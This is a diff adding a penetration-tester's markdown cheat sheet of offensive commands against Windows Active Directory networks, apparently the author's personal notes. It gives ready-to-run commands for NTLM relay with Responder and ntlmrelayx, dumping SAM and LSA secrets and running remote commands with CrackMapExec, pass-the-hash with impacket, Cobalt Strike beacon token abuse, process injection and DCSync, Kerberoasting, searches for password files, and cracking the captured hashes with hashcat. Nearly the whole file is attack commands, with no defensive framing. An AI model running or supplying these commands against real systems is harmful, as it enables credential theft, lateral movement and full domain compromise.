@@ -1,0 +1,178 @@
+#### Run Run ####
+
+**Mount**
+---------------------
+mount -t cifs //<ip>/<share name/ /mnt/share/ -o username=<username>
+
+
+**Nmap**
+--------------------
+###From @killswitch-GUI :: 
+
+Discovery - nmap -Pn -n -sS -p 21-23,25,53,111,137,139,445,80,443,3389,5800,5900,8443,8080 --min-hostgroup 255 --min-rtt-timeout 0ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 2000 -oA CLIENT-# -vvv --open -iL <IPLIST>
+
+Full (Use alive hosts from GnmapParser as input) - nmap -Pn -n -sS -p- -sV --min-hostgroup 255 --min-rtt-timeout 25ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 1000 -oA <customer-#> -vvv --open -iL <IPLIST>
+
+**Responder/Ntlmrelayx**
+--------------------
+Responder(old) -
+Analysis Mode - python Responder.py -I <interface> -A
+Business Mode - python Responder.py -I <interface> -r -d -w
+Business Mode Proxy Auth - python Responder.py -I <interface> -P -v -r
+
+Relayx -
+DISABLE SMB and HTTP in: /usr/share/responder/Responder.conf
+cme smb <CIDR> --gen-relay-list targets.txt
+ntlmrelayx.py -tf targets.txt (dumps successfully authenticated system's SAM database)
+
+Responder(new)
+python3 Responder.py -wPd --disable-ess
+
+
+**CME**
+--------------------
+*BASIC*
+Basic System Details - cme smb <IP>
+Check User Authentication - cme smb -u <username> -p '<password>' -d <domain> <IP>
+Check User Authentication via hash - cme smb -u <username> -H <ntlm> -d <domain> <IP>
+
+**ADMIN**
+cme smb -u <username> -p <password> -d <domain> <IP> --sam
+cme smb -u <username> -p <password> -d <domain> <IP> --lsa
+cme smb -u <username> -p <password> -d <domain> <IP> --shares
+cme smb -u <username> -p <password> -d <domain> <IP> --sessions
+cme smb -u <username> -p <password> -d <domain> <IP> --loggedon-users
+cme smb -u <username> -p <password> -d <domain> <IP> --pass-pol
+cme smb -u <username> -p <password> -d <domain> <IP> -x '<cmd command>'
+cme smb -u <username> -p <password> -d <domain> <IP> -X '<powershell command>'
+
+**Remote Access**
+------------------
+impacket-wmiexec <domain>/<user>:<password>@<IP>
+impacket-wmiexec <domain>/<user>@<IP> -hashes :<hash>
+
+**Cobaltstrike server**
+--------------------
+- ./update
+- ./teamserver <ip> <password>  /path/to/C2/c2.profile 2020-MM-DD
+
+**SharpHound**
+--------------------
+In Windows (Easiest):
+NOTE: Set DNS to auto inside Windows box!!!
+1. runas /netonly /user:<domain>\<username> cmd.exe
+2. Copy SharpHound.exe from Kali over to Windows box.
+3. SharpHound.exe -d domain -c All -dc-ip <IP> (you can set domain field to "." to confirm domain first, and by using auxiliary/scanner/smb/smb_enum_gpp)
+
+In Linux:
+
+
+**BloodHound**
+--------------------
+- execute-assembly /path/to/sharphound.exe --CollectionMethod  All --NoSaveCache --CompressData
+- powershell-import sharphound.ps1
+- powerpick Invoke-BloodHound -CollectionMethod  Session -LoopDelay 120 MaxLoopTime 0d0h10m0s
+- powerpick Invoke-BloodHound --CollectionMethod All --NoSaveCache --RandomFilenames
+- powerpick Invoke-BloodHound --CollectionMethod All
+- Download Bloodhound.zip
+
+**BloodHound - Python Ingestor**
+--------------------
+- git clone https://github.com/fox-it/BloodHound.py
+- cd /BloodHound.py
+- python setup.py install
+- python bloodhound.py -d <domain> -u <user> -p <password> -dc <DC-FQDN> -gc <GC-FQDN> -ns <DNS-Server-IP> -c All,Session -v 
+
+## Inveigh ##
+- powershell-import inveigh.ps1
+- powerpick Invoke-Inveigh ConsoleOutput Y
+
+## Kerberoast ##
+- powershell-import autokerberoast.ps1
+- powerpick invoke-autokerberoast -Groupname "*admin*"
+
+##Kerberoast With GetUserSPNs.py##
+- python2 GetuserSPNs.py <domain>/<user>:<userPassword> --outputfile roasted.txt
+
+## GetUserSPNs.py (Alt method, has issues for me sometimes)##
+- python GetUserSPNs.py -request -dc-ip <DC-IP> <Domain>/<Username> -outputfile hashcat -debug
+
+## Rubeus ##
+- execute-assembly /path/to/rubeus.exe kerberoast /outfile:hashes.txt /format:hashcast
+
+## Powersploit ##
+- powerpick Invoke-AllChecks (/opt/PowerSploit/Privesc/PowerUp.ps1)
+- powerpick Find-LocalAdminAccess (/opt/PowerSploit/Recon/PowerView.ps1)
+- powerpick Invoke-ShareFinder -CheckShareAccess (/opt/PowerSploit/Recon/PowerView.ps1)
+- powerrpick Invoke-UserHunter -UserName "<username>" (/opt/PowerSploit/Recon/PowerView.ps1)
+
+## Seatbelt ## 
+- execute-assembly /root/Desktop/Seatbelt.exe All
+
+**Shell Commands**
+- shell net use
+- shell net user <user> /domain
+- shell net localgroup "<groupname>"
+- shell net group "Domain Admins"
+- shell net group "<group>" /domain | find /I "<name>"
+- shell dir /s /b *passw*.*
+- shell dir /s /b "Groups.xml"
+- shell dir /s /b "Unattend.xml
+- shell whoami /all
+- shell systeminfo
+- shell netstat -ano
+- shell net computers
+- shell systeminfo
+- shell sc query
+- shell sc qc <service name>
+
+**Beacon\User\Token Manipulation**
+- spawn https\http
+- spawnas <domain>\<username> <password>
+- wmi <FQDN or IP> http
+
+- make_token <domain>\<username> <password>
+- pth <domain>\<user> <hash>
+
+- dsync to <domain>\<user> <password>
+- dcsync <domain> ossdomain\<user>
+- dcsync <FQDN domain> <domain>\<machine>$
+
+- inject <pid> x64\x86 http
+
+**Burp (set to use 2Gb RAM only)**
+--------------------
+- java -jar -Xmx2G /path/to/burpsuite.jar --project-file=<name>.burp
+
+**Burp Socks Proxy**
+---------------------
+1) Create an ssh tunnel specifying the SOCKS proxy port with the -D option -> ssh user@server_name_or_ip_address -D 4321
+2) Use netstat to verify that the port we specified is listening on our attacking system -> netstat -ant |grep -i listen
+3) Tell Burp Suite to use our SOCKS proxy by specifying the IP address and port number in the user options tab -> Host: 127.0.0.1 Port: 4321
+
+
+
+
+
+Aquatone
+--------------------
+- cat <list_of_servers.txt> | aquatone 
+
+Hashcat
+--------------------
+<-Hash Types->
+Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) --> -m 19600
+Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) --> -m 19700
+Kerberos 5 TGS-REP etype 23 (RC4-HMAC-MD5) --> -m 13100
+
+NTLM --> -m 1000
+NTLMV1 --> -m 5500
+NTLMV2 --> -m 5600
+
+- ./hashcat -w 2 -O -a 0 -m <hash type> <hashes_to_crack.txt> <wordlist.txt>
+- ./hashcat -w 2 -O -a 0 -m <hash type> <hashes_to_crack.txt> <wordlist.txt> -r /rules/best64.rule
+
+Brute (Old symbol define doesn't work anymore? Type it out manually instead.)
+- hashcat32.exe -a 3 -m <hash type> <hash_to_crack.txt> -1 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$* ?1?1?1?1?1?1?1?1 --session=NameOfSession
+- hashcat32.exe -a 3 -m <hash type> <hash_to_crack.txt> -1 uld ?1?1?1?1?1?1?1?1 --session=NameOfSession
+
